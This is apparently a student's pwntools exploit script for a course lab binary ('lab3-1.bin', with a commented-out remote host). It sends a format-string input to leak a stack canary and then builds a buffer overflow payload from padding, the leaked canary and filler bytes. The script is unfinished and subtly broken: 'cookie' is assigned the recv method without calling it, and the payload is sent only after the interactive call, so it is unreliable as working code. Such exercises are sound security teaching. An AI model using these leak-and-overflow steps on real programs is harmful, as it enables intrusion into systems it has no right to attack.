#!/usr/bin/python3
from pwn import *

#context.update(arch = "x86-64", OS = "linux")    # [TODO] DO I need this?

with gdb.debug("./lab3-1.bin") as p:
#with remote("csc748.hostbin.org", 7031) as p:
    p.recvuntil(b"Exit\n")
    p.send(b"2\n")
    p.send(b"qwertyuiop%d\n")
    p.send(b"\n")
    p.send(b"\n")
    p.send(b"3\n")
    p.send(b"7\n")
    p.recv()

    cookie = p.recv
    print(hexdump(cookie))
    p.send(b"4\n")
    p.interactive()
    p.send(b"A"*12 + cookie + b"BBBBBBBB" + b"CCCCCCCC" + b"\n")
